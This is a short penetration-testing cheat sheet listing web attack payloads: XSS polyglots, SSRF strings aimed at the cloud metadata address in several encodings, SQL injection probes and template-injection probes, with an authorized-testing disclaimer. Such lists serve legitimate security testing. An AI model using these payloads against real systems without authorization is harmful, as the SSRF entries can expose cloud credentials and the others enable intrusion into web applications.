# Payload Arsenal (Authorized Testing Only)

## XSS polyglots
- `"><svg/onload=alert(1)>`
- `</script><img src=x onerror=alert(document.domain)>`
- `'--><svg/onload=confirm(1)>`

## SSRF bypass candidates
- `http://169.254.169.254/latest/meta-data/`
- `http://[::ffff:169.254.169.254]/latest/meta-data/`
- `http://0xA9FEA9FE/latest/meta-data/`
- `http://2130706433/`

## SQLi probes
- `' OR '1'='1`
- `" OR "1"="1`
- `' UNION SELECT NULL--`

## SSTI probes
- `{{7*7}}`
- `${7*7}`
- `<%= 7*7 %>`

> Use payloads only against systems you are explicitly authorized to test.
